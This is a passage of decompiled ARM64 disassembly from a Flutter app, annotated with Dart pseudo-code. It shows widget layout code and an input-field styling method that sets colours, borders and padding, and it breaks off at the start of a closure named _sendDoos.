    // 0x805af0: LoadField: r2 = r0->field_3b
    //     0x805af0: ldur            w2, [x0, #0x3b]
    // 0x805af4: DecompressPointer r2
    //     0x805af4: add             x2, x2, HEAP, lsl #32
    // 0x805af8: stur            x2, [fp, #-0x18]
    // 0x805afc: r0 = TextStyle()
    //     0x805afc: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x805b00: mov             x1, x0
    // 0x805b04: r0 = true
    //     0x805b04: add             x0, NULL, #0x20  ; true
    // 0x805b08: stur            x1, [fp, #-8]
    // 0x805b0c: StoreField: r1->field_7 = r0
    //     0x805b0c: stur            w0, [x1, #7]
    // 0x805b10: ldur            x0, [fp, #-0x18]
    // 0x805b14: StoreField: r1->field_b = r0
    //     0x805b14: stur            w0, [x1, #0xb]
    // 0x805b18: r0 = Instance_FontWeight
    //     0x805b18: add             x0, PP, #0xc, lsl #12  ; [pp+0xcf08] Obj!FontWeight@a0c471
    //     0x805b1c: ldr             x0, [x0, #0xf08]
    // 0x805b20: StoreField: r1->field_23 = r0
    //     0x805b20: stur            w0, [x1, #0x23]
    // 0x805b24: r0 = Text()
    //     0x805b24: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x805b28: mov             x3, x0
    // 0x805b2c: ldur            x0, [fp, #-0x20]
    // 0x805b30: stur            x3, [fp, #-0x18]
    // 0x805b34: StoreField: r3->field_b = r0
    //     0x805b34: stur            w0, [x3, #0xb]
    // 0x805b38: ldur            x0, [fp, #-8]
    // 0x805b3c: StoreField: r3->field_13 = r0
    //     0x805b3c: stur            w0, [x3, #0x13]
    // 0x805b40: r1 = Null
    //     0x805b40: mov             x1, NULL
    // 0x805b44: r2 = 6
    //     0x805b44: mov             x2, #6
    // 0x805b48: r0 = AllocateArray()
    //     0x805b48: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x805b4c: mov             x2, x0
    // 0x805b50: ldur            x0, [fp, #-0x28]
    // 0x805b54: stur            x2, [fp, #-8]
    // 0x805b58: StoreField: r2->field_f = r0
    //     0x805b58: stur            w0, [x2, #0xf]
    // 0x805b5c: r16 = Instance_SizedBox
    //     0x805b5c: add             x16, PP, #0x11, lsl #12  ; [pp+0x11580] Obj!SizedBox@a3a861
    //     0x805b60: ldr             x16, [x16, #0x580]
    // 0x805b64: StoreField: r2->field_13 = r16
    //     0x805b64: stur            w16, [x2, #0x13]
    // 0x805b68: ldur            x0, [fp, #-0x18]
    // 0x805b6c: ArrayStore: r2[0] = r0  ; List_4
    //     0x805b6c: stur            w0, [x2, #0x17]
    // 0x805b70: r1 = <Widget>
    //     0x805b70: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x805b74: r0 = AllocateGrowableArray()
    //     0x805b74: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x805b78: mov             x1, x0
    // 0x805b7c: ldur            x0, [fp, #-8]
    // 0x805b80: stur            x1, [fp, #-0x18]
    // 0x805b84: StoreField: r1->field_f = r0
    //     0x805b84: stur            w0, [x1, #0xf]
    // 0x805b88: r2 = 6
    //     0x805b88: mov             x2, #6
    // 0x805b8c: StoreField: r1->field_b = r2
    //     0x805b8c: stur            w2, [x1, #0xb]
    // 0x805b90: r0 = Row()
    //     0x805b90: bl              #0x6b1530  ; AllocateRowStub -> Row (size=0x38)
    // 0x805b94: mov             x3, x0
    // 0x805b98: r0 = Instance_Axis
    //     0x805b98: ldr             x0, [PP, #0x46d8]  ; [pp+0x46d8] Obj!Axis@a407e1
    // 0x805b9c: stur            x3, [fp, #-8]
    // 0x805ba0: StoreField: r3->field_f = r0
    //     0x805ba0: stur            w0, [x3, #0xf]
    // 0x805ba4: r0 = Instance_MainAxisAlignment
    //     0x805ba4: ldr             x0, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x805ba8: StoreField: r3->field_13 = r0
    //     0x805ba8: stur            w0, [x3, #0x13]
    // 0x805bac: r4 = Instance_MainAxisSize
    //     0x805bac: add             x4, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x805bb0: ldr             x4, [x4, #0xbc0]
    // 0x805bb4: ArrayStore: r3[0] = r4  ; List_4
    //     0x805bb4: stur            w4, [x3, #0x17]
    // 0x805bb8: r1 = Instance_CrossAxisAlignment
    //     0x805bb8: ldr             x1, [PP, #0x6f88]  ; [pp+0x6f88] Obj!CrossAxisAlignment@a402c1
    // 0x805bbc: StoreField: r3->field_1b = r1
    //     0x805bbc: stur            w1, [x3, #0x1b]
    // 0x805bc0: r5 = Instance_VerticalDirection
    //     0x805bc0: ldr             x5, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x805bc4: StoreField: r3->field_23 = r5
    //     0x805bc4: stur            w5, [x3, #0x23]
    // 0x805bc8: r6 = Instance_Clip
    //     0x805bc8: ldr             x6, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x805bcc: StoreField: r3->field_2b = r6
    //     0x805bcc: stur            w6, [x3, #0x2b]
    // 0x805bd0: StoreField: r3->field_2f = rZR
    //     0x805bd0: stur            xzr, [x3, #0x2f]
    // 0x805bd4: ldur            x1, [fp, #-0x18]
    // 0x805bd8: StoreField: r3->field_b = r1
    //     0x805bd8: stur            w1, [x3, #0xb]
    // 0x805bdc: r1 = Null
    //     0x805bdc: mov             x1, NULL
    // 0x805be0: r2 = 6
    //     0x805be0: mov             x2, #6
    // 0x805be4: r0 = AllocateArray()
    //     0x805be4: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x805be8: mov             x2, x0
    // 0x805bec: ldur            x0, [fp, #-8]
    // 0x805bf0: stur            x2, [fp, #-0x18]
    // 0x805bf4: StoreField: r2->field_f = r0
    //     0x805bf4: stur            w0, [x2, #0xf]
    // 0x805bf8: r16 = Instance_SizedBox
    //     0x805bf8: add             x16, PP, #0x12, lsl #12  ; [pp+0x12050] Obj!SizedBox@a3a801
    //     0x805bfc: ldr             x16, [x16, #0x50]
    // 0x805c00: StoreField: r2->field_13 = r16
    //     0x805c00: stur            w16, [x2, #0x13]
    // 0x805c04: ldur            x0, [fp, #-0x10]
    // 0x805c08: ArrayStore: r2[0] = r0  ; List_4
    //     0x805c08: stur            w0, [x2, #0x17]
    // 0x805c0c: r1 = <Widget>
    //     0x805c0c: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x805c10: r0 = AllocateGrowableArray()
    //     0x805c10: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x805c14: mov             x1, x0
    // 0x805c18: ldur            x0, [fp, #-0x18]
    // 0x805c1c: stur            x1, [fp, #-8]
    // 0x805c20: StoreField: r1->field_f = r0
    //     0x805c20: stur            w0, [x1, #0xf]
    // 0x805c24: r0 = 6
    //     0x805c24: mov             x0, #6
    // 0x805c28: StoreField: r1->field_b = r0
    //     0x805c28: stur            w0, [x1, #0xb]
    // 0x805c2c: r0 = Column()
    //     0x805c2c: bl              #0x641538  ; AllocateColumnStub -> Column (size=0x38)
    // 0x805c30: mov             x1, x0
    // 0x805c34: r0 = Instance_Axis
    //     0x805c34: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x805c38: stur            x1, [fp, #-0x10]
    // 0x805c3c: StoreField: r1->field_f = r0
    //     0x805c3c: stur            w0, [x1, #0xf]
    // 0x805c40: r0 = Instance_MainAxisAlignment
    //     0x805c40: ldr             x0, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x805c44: StoreField: r1->field_13 = r0
    //     0x805c44: stur            w0, [x1, #0x13]
    // 0x805c48: r0 = Instance_MainAxisSize
    //     0x805c48: add             x0, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x805c4c: ldr             x0, [x0, #0xbc0]
    // 0x805c50: ArrayStore: r1[0] = r0  ; List_4
    //     0x805c50: stur            w0, [x1, #0x17]
    // 0x805c54: r0 = Instance_CrossAxisAlignment
    //     0x805c54: add             x0, PP, #0xa, lsl #12  ; [pp+0xada0] Obj!CrossAxisAlignment@a402e1
    //     0x805c58: ldr             x0, [x0, #0xda0]
    // 0x805c5c: StoreField: r1->field_1b = r0
    //     0x805c5c: stur            w0, [x1, #0x1b]
    // 0x805c60: r0 = Instance_VerticalDirection
    //     0x805c60: ldr             x0, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x805c64: StoreField: r1->field_23 = r0
    //     0x805c64: stur            w0, [x1, #0x23]
    // 0x805c68: r0 = Instance_Clip
    //     0x805c68: ldr             x0, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x805c6c: StoreField: r1->field_2b = r0
    //     0x805c6c: stur            w0, [x1, #0x2b]
    // 0x805c70: StoreField: r1->field_2f = rZR
    //     0x805c70: stur            xzr, [x1, #0x2f]
    // 0x805c74: ldur            x0, [fp, #-8]
    // 0x805c78: StoreField: r1->field_b = r0
    //     0x805c78: stur            w0, [x1, #0xb]
    // 0x805c7c: r0 = Container()
    //     0x805c7c: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x805c80: stur            x0, [fp, #-8]
    // 0x805c84: r16 = Instance_EdgeInsets
    //     0x805c84: add             x16, PP, #0x11, lsl #12  ; [pp+0x11e18] Obj!EdgeInsets@a06141
    //     0x805c88: ldr             x16, [x16, #0xe18]
    // 0x805c8c: ldur            lr, [fp, #-0x38]
    // 0x805c90: stp             lr, x16, [SP, #8]
    // 0x805c94: ldur            x16, [fp, #-0x10]
    // 0x805c98: str             x16, [SP]
    // 0x805c9c: mov             x1, x0
    // 0x805ca0: r4 = const [0, 0x4, 0x3, 0x1, child, 0x3, decoration, 0x2, padding, 0x1, null]
    //     0x805ca0: add             x4, PP, #0x11, lsl #12  ; [pp+0x11e58] List(11) [0, 0x4, 0x3, 0x1, "child", 0x3, "decoration", 0x2, "padding", 0x1, Null]
    //     0x805ca4: ldr             x4, [x4, #0xe58]
    // 0x805ca8: r0 = Container()
    //     0x805ca8: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x805cac: ldur            x0, [fp, #-8]
    // 0x805cb0: LeaveFrame
    //     0x805cb0: mov             SP, fp
    //     0x805cb4: ldp             fp, lr, [SP], #0x10
    // 0x805cb8: ret
    //     0x805cb8: ret             
    // 0x805cbc: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x805cbc: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x805cc0: b               #0x805998
  }
  _ _inputStyle(/* No info */) {
    // ** addr: 0x805cc4, size: 0x338
    // 0x805cc4: EnterFrame
    //     0x805cc4: stp             fp, lr, [SP, #-0x10]!
    //     0x805cc8: mov             fp, SP
    // 0x805ccc: AllocStack(0x30)
    //     0x805ccc: sub             SP, SP, #0x30
    // 0x805cd0: SetupParameters(dynamic _ /* r2 => r2, fp-0x10 */, {dynamic isIcmp = false /* r0, fp-0x8 */})
    //     0x805cd0: stur            x2, [fp, #-0x10]
    //     0x805cd4: ldur            w0, [x4, #0x13]
    //     0x805cd8: ldur            w1, [x4, #0x1f]
    //     0x805cdc: add             x1, x1, HEAP, lsl #32
    //     0x805ce0: add             x16, PP, #0x41, lsl #12  ; [pp+0x41098] "isIcmp"
    //     0x805ce4: ldr             x16, [x16, #0x98]
    //     0x805ce8: cmp             w1, w16
    //     0x805cec: b.ne            #0x805d08
    //     0x805cf0: ldur            w1, [x4, #0x23]
    //     0x805cf4: add             x1, x1, HEAP, lsl #32
    //     0x805cf8: sub             w3, w0, w1
    //     0x805cfc: add             x0, fp, w3, sxtw #2
    //     0x805d00: ldr             x0, [x0, #8]
    //     0x805d04: b               #0x805d0c
    //     0x805d08: add             x0, NULL, #0x30  ; false
    //     0x805d0c: stur            x0, [fp, #-8]
    // 0x805d10: tbnz            w0, #4, #0x805d58
    // 0x805d14: r0 = Color()
    //     0x805d14: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x805d18: mov             x1, x0
    // 0x805d1c: r0 = Instance_ColorSpace
    //     0x805d1c: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x805d20: StoreField: r1->field_27 = r0
    //     0x805d20: stur            w0, [x1, #0x27]
    // 0x805d24: d0 = 1.000000
    //     0x805d24: fmov            d0, #1.00000000
    // 0x805d28: StoreField: r1->field_7 = d0
    //     0x805d28: stur            d0, [x1, #7]
    // 0x805d2c: d1 = 0.882353
    //     0x805d2c: add             x17, PP, #0x14, lsl #12  ; [pp+0x14468] IMM: double(0.8823529411764706) from 0x3fec3c3c3c3c3c3c
    //     0x805d30: ldr             d1, [x17, #0x468]
    // 0x805d34: StoreField: r1->field_f = d1
    //     0x805d34: stur            d1, [x1, #0xf]
    // 0x805d38: d2 = 0.501961
    //     0x805d38: add             x17, PP, #0x14, lsl #12  ; [pp+0x14470] IMM: double(0.5019607843137255) from 0x3fe0101010101010
    //     0x805d3c: ldr             d2, [x17, #0x470]
    // 0x805d40: ArrayStore: r1[0] = d2  ; List_8
    //     0x805d40: stur            d2, [x1, #0x17]
    // 0x805d44: d3 = 0.490196
    //     0x805d44: add             x17, PP, #0x14, lsl #12  ; [pp+0x14478] IMM: double(0.49019607843137253) from 0x3fdf5f5f5f5f5f5f
    //     0x805d48: ldr             d3, [x17, #0x478]
    // 0x805d4c: StoreField: r1->field_1f = d3
    //     0x805d4c: stur            d3, [x1, #0x1f]
    // 0x805d50: mov             x2, x1
    // 0x805d54: b               #0x805d80
    // 0x805d58: d0 = 1.000000
    //     0x805d58: fmov            d0, #1.00000000
    // 0x805d5c: r0 = Instance_ColorSpace
    //     0x805d5c: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x805d60: d1 = 0.882353
    //     0x805d60: add             x17, PP, #0x14, lsl #12  ; [pp+0x14468] IMM: double(0.8823529411764706) from 0x3fec3c3c3c3c3c3c
    //     0x805d64: ldr             d1, [x17, #0x468]
    // 0x805d68: d2 = 0.501961
    //     0x805d68: add             x17, PP, #0x14, lsl #12  ; [pp+0x14470] IMM: double(0.5019607843137255) from 0x3fe0101010101010
    //     0x805d6c: ldr             d2, [x17, #0x470]
    // 0x805d70: d3 = 0.490196
    //     0x805d70: add             x17, PP, #0x14, lsl #12  ; [pp+0x14478] IMM: double(0.49019607843137253) from 0x3fdf5f5f5f5f5f5f
    //     0x805d74: ldr             d3, [x17, #0x478]
    // 0x805d78: r2 = Instance_Color
    //     0x805d78: add             x2, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x805d7c: ldr             x2, [x2, #0xf80]
    // 0x805d80: ldur            x1, [fp, #-8]
    // 0x805d84: stur            x2, [fp, #-0x18]
    // 0x805d88: r0 = TextStyle()
    //     0x805d88: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x805d8c: mov             x1, x0
    // 0x805d90: r0 = true
    //     0x805d90: add             x0, NULL, #0x20  ; true
    // 0x805d94: stur            x1, [fp, #-0x20]
    // 0x805d98: StoreField: r1->field_7 = r0
    //     0x805d98: stur            w0, [x1, #7]
    // 0x805d9c: ldur            x2, [fp, #-0x18]
    // 0x805da0: StoreField: r1->field_b = r2
    //     0x805da0: stur            w2, [x1, #0xb]
    // 0x805da4: ldur            x2, [fp, #-8]
    // 0x805da8: tbnz            w2, #4, #0x805df0
    // 0x805dac: r0 = Color()
    //     0x805dac: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x805db0: mov             x1, x0
    // 0x805db4: r0 = Instance_ColorSpace
    //     0x805db4: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x805db8: StoreField: r1->field_27 = r0
    //     0x805db8: stur            w0, [x1, #0x27]
    // 0x805dbc: d0 = 1.000000
    //     0x805dbc: fmov            d0, #1.00000000
    // 0x805dc0: StoreField: r1->field_7 = d0
    //     0x805dc0: stur            d0, [x1, #7]
    // 0x805dc4: d1 = 0.882353
    //     0x805dc4: add             x17, PP, #0x14, lsl #12  ; [pp+0x14468] IMM: double(0.8823529411764706) from 0x3fec3c3c3c3c3c3c
    //     0x805dc8: ldr             d1, [x17, #0x468]
    // 0x805dcc: StoreField: r1->field_f = d1
    //     0x805dcc: stur            d1, [x1, #0xf]
    // 0x805dd0: d2 = 0.501961
    //     0x805dd0: add             x17, PP, #0x14, lsl #12  ; [pp+0x14470] IMM: double(0.5019607843137255) from 0x3fe0101010101010
    //     0x805dd4: ldr             d2, [x17, #0x470]
    // 0x805dd8: ArrayStore: r1[0] = d2  ; List_8
    //     0x805dd8: stur            d2, [x1, #0x17]
    // 0x805ddc: d3 = 0.490196
    //     0x805ddc: add             x17, PP, #0x14, lsl #12  ; [pp+0x14478] IMM: double(0.49019607843137253) from 0x3fdf5f5f5f5f5f5f
    //     0x805de0: ldr             d3, [x17, #0x478]
    // 0x805de4: StoreField: r1->field_1f = d3
    //     0x805de4: stur            d3, [x1, #0x1f]
    // 0x805de8: mov             x2, x1
    // 0x805dec: b               #0x805e18
    // 0x805df0: d0 = 1.000000
    //     0x805df0: fmov            d0, #1.00000000
    // 0x805df4: r0 = Instance_ColorSpace
    //     0x805df4: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x805df8: d1 = 0.882353
    //     0x805df8: add             x17, PP, #0x14, lsl #12  ; [pp+0x14468] IMM: double(0.8823529411764706) from 0x3fec3c3c3c3c3c3c
    //     0x805dfc: ldr             d1, [x17, #0x468]
    // 0x805e00: d2 = 0.501961
    //     0x805e00: add             x17, PP, #0x14, lsl #12  ; [pp+0x14470] IMM: double(0.5019607843137255) from 0x3fe0101010101010
    //     0x805e04: ldr             d2, [x17, #0x470]
    // 0x805e08: d3 = 0.490196
    //     0x805e08: add             x17, PP, #0x14, lsl #12  ; [pp+0x14478] IMM: double(0.49019607843137253) from 0x3fdf5f5f5f5f5f5f
    //     0x805e0c: ldr             d3, [x17, #0x478]
    // 0x805e10: r2 = Instance_Color
    //     0x805e10: add             x2, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x805e14: ldr             x2, [x2, #0xf80]
    // 0x805e18: ldur            x1, [fp, #-8]
    // 0x805e1c: stur            x2, [fp, #-0x18]
    // 0x805e20: r0 = BorderSide()
    //     0x805e20: bl              #0x58d2d4  ; AllocateBorderSideStub -> BorderSide (size=0x20)
    // 0x805e24: mov             x1, x0
    // 0x805e28: ldur            x0, [fp, #-0x18]
    // 0x805e2c: stur            x1, [fp, #-0x28]
    // 0x805e30: StoreField: r1->field_7 = r0
    //     0x805e30: stur            w0, [x1, #7]
    // 0x805e34: d0 = 1.000000
    //     0x805e34: fmov            d0, #1.00000000
    // 0x805e38: StoreField: r1->field_b = d0
    //     0x805e38: stur            d0, [x1, #0xb]
    // 0x805e3c: r0 = Instance_BorderStyle
    //     0x805e3c: add             x0, PP, #0xc, lsl #12  ; [pp+0xce40] Obj!BorderStyle@a406e1
    //     0x805e40: ldr             x0, [x0, #0xe40]
    // 0x805e44: StoreField: r1->field_13 = r0
    //     0x805e44: stur            w0, [x1, #0x13]
    // 0x805e48: d1 = -1.000000
    //     0x805e48: fmov            d1, #-1.00000000
    // 0x805e4c: ArrayStore: r1[0] = d1  ; List_8
    //     0x805e4c: stur            d1, [x1, #0x17]
    // 0x805e50: r0 = Radius()
    //     0x805e50: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x805e54: d0 = 16.000000
    //     0x805e54: fmov            d0, #16.00000000
    // 0x805e58: stur            x0, [fp, #-0x18]
    // 0x805e5c: StoreField: r0->field_7 = d0
    //     0x805e5c: stur            d0, [x0, #7]
    // 0x805e60: StoreField: r0->field_f = d0
    //     0x805e60: stur            d0, [x0, #0xf]
    // 0x805e64: r0 = BorderRadius()
    //     0x805e64: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x805e68: mov             x1, x0
    // 0x805e6c: ldur            x0, [fp, #-0x18]
    // 0x805e70: stur            x1, [fp, #-0x30]
    // 0x805e74: StoreField: r1->field_7 = r0
    //     0x805e74: stur            w0, [x1, #7]
    // 0x805e78: StoreField: r1->field_b = r0
    //     0x805e78: stur            w0, [x1, #0xb]
    // 0x805e7c: StoreField: r1->field_f = r0
    //     0x805e7c: stur            w0, [x1, #0xf]
    // 0x805e80: StoreField: r1->field_13 = r0
    //     0x805e80: stur            w0, [x1, #0x13]
    // 0x805e84: r0 = OutlineInputBorder()
    //     0x805e84: bl              #0x58ea94  ; AllocateOutlineInputBorderStub -> OutlineInputBorder (size=0x18)
    // 0x805e88: mov             x1, x0
    // 0x805e8c: ldur            x0, [fp, #-0x30]
    // 0x805e90: stur            x1, [fp, #-0x18]
    // 0x805e94: StoreField: r1->field_13 = r0
    //     0x805e94: stur            w0, [x1, #0x13]
    // 0x805e98: d0 = 4.000000
    //     0x805e98: fmov            d0, #4.00000000
    // 0x805e9c: StoreField: r1->field_b = d0
    //     0x805e9c: stur            d0, [x1, #0xb]
    // 0x805ea0: ldur            x0, [fp, #-0x28]
    // 0x805ea4: StoreField: r1->field_7 = r0
    //     0x805ea4: stur            w0, [x1, #7]
    // 0x805ea8: ldur            x0, [fp, #-8]
    // 0x805eac: tbnz            w0, #4, #0x805ef4
    // 0x805eb0: r0 = Color()
    //     0x805eb0: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x805eb4: mov             x1, x0
    // 0x805eb8: r0 = Instance_ColorSpace
    //     0x805eb8: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x805ebc: StoreField: r1->field_27 = r0
    //     0x805ebc: stur            w0, [x1, #0x27]
    // 0x805ec0: d0 = 1.000000
    //     0x805ec0: fmov            d0, #1.00000000
    // 0x805ec4: StoreField: r1->field_7 = d0
    //     0x805ec4: stur            d0, [x1, #7]
    // 0x805ec8: d1 = 0.882353
    //     0x805ec8: add             x17, PP, #0x14, lsl #12  ; [pp+0x14468] IMM: double(0.8823529411764706) from 0x3fec3c3c3c3c3c3c
    //     0x805ecc: ldr             d1, [x17, #0x468]
    // 0x805ed0: StoreField: r1->field_f = d1
    //     0x805ed0: stur            d1, [x1, #0xf]
    // 0x805ed4: d1 = 0.501961
    //     0x805ed4: add             x17, PP, #0x14, lsl #12  ; [pp+0x14470] IMM: double(0.5019607843137255) from 0x3fe0101010101010
    //     0x805ed8: ldr             d1, [x17, #0x470]
    // 0x805edc: ArrayStore: r1[0] = d1  ; List_8
    //     0x805edc: stur            d1, [x1, #0x17]
    // 0x805ee0: d1 = 0.490196
    //     0x805ee0: add             x17, PP, #0x14, lsl #12  ; [pp+0x14478] IMM: double(0.49019607843137253) from 0x3fdf5f5f5f5f5f5f
    //     0x805ee4: ldr             d1, [x17, #0x478]
    // 0x805ee8: StoreField: r1->field_1f = d1
    //     0x805ee8: stur            d1, [x1, #0x1f]
    // 0x805eec: mov             x3, x1
    // 0x805ef0: b               #0x805f00
    // 0x805ef4: d0 = 1.000000
    //     0x805ef4: fmov            d0, #1.00000000
    // 0x805ef8: r3 = Instance_Color
    //     0x805ef8: add             x3, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x805efc: ldr             x3, [x3, #0xf80]
    // 0x805f00: ldur            x2, [fp, #-0x10]
    // 0x805f04: ldur            x1, [fp, #-0x20]
    // 0x805f08: ldur            x0, [fp, #-0x18]
    // 0x805f0c: stur            x3, [fp, #-8]
    // 0x805f10: r0 = BorderSide()
    //     0x805f10: bl              #0x58d2d4  ; AllocateBorderSideStub -> BorderSide (size=0x20)
    // 0x805f14: mov             x1, x0
    // 0x805f18: ldur            x0, [fp, #-8]
    // 0x805f1c: stur            x1, [fp, #-0x28]
    // 0x805f20: StoreField: r1->field_7 = r0
    //     0x805f20: stur            w0, [x1, #7]
    // 0x805f24: d0 = 1.000000
    //     0x805f24: fmov            d0, #1.00000000
    // 0x805f28: StoreField: r1->field_b = d0
    //     0x805f28: stur            d0, [x1, #0xb]
    // 0x805f2c: r0 = Instance_BorderStyle
    //     0x805f2c: add             x0, PP, #0xc, lsl #12  ; [pp+0xce40] Obj!BorderStyle@a406e1
    //     0x805f30: ldr             x0, [x0, #0xe40]
    // 0x805f34: StoreField: r1->field_13 = r0
    //     0x805f34: stur            w0, [x1, #0x13]
    // 0x805f38: d0 = -1.000000
    //     0x805f38: fmov            d0, #-1.00000000
    // 0x805f3c: ArrayStore: r1[0] = d0  ; List_8
    //     0x805f3c: stur            d0, [x1, #0x17]
    // 0x805f40: r0 = Radius()
    //     0x805f40: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x805f44: d0 = 16.000000
    //     0x805f44: fmov            d0, #16.00000000
    // 0x805f48: stur            x0, [fp, #-8]
    // 0x805f4c: StoreField: r0->field_7 = d0
    //     0x805f4c: stur            d0, [x0, #7]
    // 0x805f50: StoreField: r0->field_f = d0
    //     0x805f50: stur            d0, [x0, #0xf]
    // 0x805f54: r0 = BorderRadius()
    //     0x805f54: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x805f58: mov             x1, x0
    // 0x805f5c: ldur            x0, [fp, #-8]
    // 0x805f60: stur            x1, [fp, #-0x30]
    // 0x805f64: StoreField: r1->field_7 = r0
    //     0x805f64: stur            w0, [x1, #7]
    // 0x805f68: StoreField: r1->field_b = r0
    //     0x805f68: stur            w0, [x1, #0xb]
    // 0x805f6c: StoreField: r1->field_f = r0
    //     0x805f6c: stur            w0, [x1, #0xf]
    // 0x805f70: StoreField: r1->field_13 = r0
    //     0x805f70: stur            w0, [x1, #0x13]
    // 0x805f74: r0 = OutlineInputBorder()
    //     0x805f74: bl              #0x58ea94  ; AllocateOutlineInputBorderStub -> OutlineInputBorder (size=0x18)
    // 0x805f78: mov             x1, x0
    // 0x805f7c: ldur            x0, [fp, #-0x30]
    // 0x805f80: stur            x1, [fp, #-8]
    // 0x805f84: StoreField: r1->field_13 = r0
    //     0x805f84: stur            w0, [x1, #0x13]
    // 0x805f88: d0 = 4.000000
    //     0x805f88: fmov            d0, #4.00000000
    // 0x805f8c: StoreField: r1->field_b = d0
    //     0x805f8c: stur            d0, [x1, #0xb]
    // 0x805f90: ldur            x0, [fp, #-0x28]
    // 0x805f94: StoreField: r1->field_7 = r0
    //     0x805f94: stur            w0, [x1, #7]
    // 0x805f98: r0 = InputDecoration()
    //     0x805f98: bl              #0x6816c8  ; AllocateInputDecorationStub -> InputDecoration (size=0xf0)
    // 0x805f9c: ldur            x1, [fp, #-0x10]
    // 0x805fa0: StoreField: r0->field_2f = r1
    //     0x805fa0: stur            w1, [x0, #0x2f]
    // 0x805fa4: ldur            x1, [fp, #-0x20]
    // 0x805fa8: StoreField: r0->field_37 = r1
    //     0x805fa8: stur            w1, [x0, #0x37]
    // 0x805fac: r1 = true
    //     0x805fac: add             x1, NULL, #0x20  ; true
    // 0x805fb0: StoreField: r0->field_47 = r1
    //     0x805fb0: stur            w1, [x0, #0x47]
    // 0x805fb4: StoreField: r0->field_4b = r1
    //     0x805fb4: stur            w1, [x0, #0x4b]
    // 0x805fb8: r2 = false
    //     0x805fb8: add             x2, NULL, #0x30  ; false
    // 0x805fbc: StoreField: r0->field_4f = r2
    //     0x805fbc: stur            w2, [x0, #0x4f]
    // 0x805fc0: r2 = Instance_EdgeInsets
    //     0x805fc0: add             x2, PP, #0x18, lsl #12  ; [pp+0x18820] Obj!EdgeInsets@a07581
    //     0x805fc4: ldr             x2, [x2, #0x820]
    // 0x805fc8: StoreField: r0->field_6f = r2
    //     0x805fc8: stur            w2, [x0, #0x6f]
    // 0x805fcc: StoreField: r0->field_b3 = r1
    //     0x805fcc: stur            w1, [x0, #0xb3]
    // 0x805fd0: r2 = Instance_Color
    //     0x805fd0: add             x2, PP, #0x32, lsl #12  ; [pp+0x32f98] Obj!Color@a11431
    //     0x805fd4: ldr             x2, [x2, #0xf98]
    // 0x805fd8: StoreField: r0->field_b7 = r2
    //     0x805fd8: stur            w2, [x0, #0xb7]
    // 0x805fdc: ldur            x2, [fp, #-8]
    // 0x805fe0: StoreField: r0->field_c7 = r2
    //     0x805fe0: stur            w2, [x0, #0xc7]
    // 0x805fe4: ldur            x2, [fp, #-0x18]
    // 0x805fe8: StoreField: r0->field_d3 = r2
    //     0x805fe8: stur            w2, [x0, #0xd3]
    // 0x805fec: StoreField: r0->field_db = r1
    //     0x805fec: stur            w1, [x0, #0xdb]
    // 0x805ff0: LeaveFrame
    //     0x805ff0: mov             SP, fp
    //     0x805ff4: ldp             fp, lr, [SP], #0x10
    // 0x805ff8: ret
    //     0x805ff8: ret             
  }
  [closure] Future<void> _sendDoos(dynamic) {
    // ** addr: 0x806008, size: 0x38
    // 0x806008: EnterFrame
    //     0x806008: stp             fp, lr, [SP, #-0x10]!
    //     0x80600c: mov             fp, SP
    // 0x806010: ldr             x0, [fp, #0x10]
    // 0x806014: ArrayLoad: r1 = r0[0]  ; List_4
    //     0x806014: ldur            w1, [x0, #0x17]
    // 0x806018: DecompressPointer r1
    //     0x806018: add             x1, x1, HEAP, lsl #32
    // 0x80601c: CheckStackOverflow
    //     0x80601c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x806020: cmp             SP, x16
    //     0x806024: b.ls            #0x806038
    // 0x806028: r0 = _sendDoos()
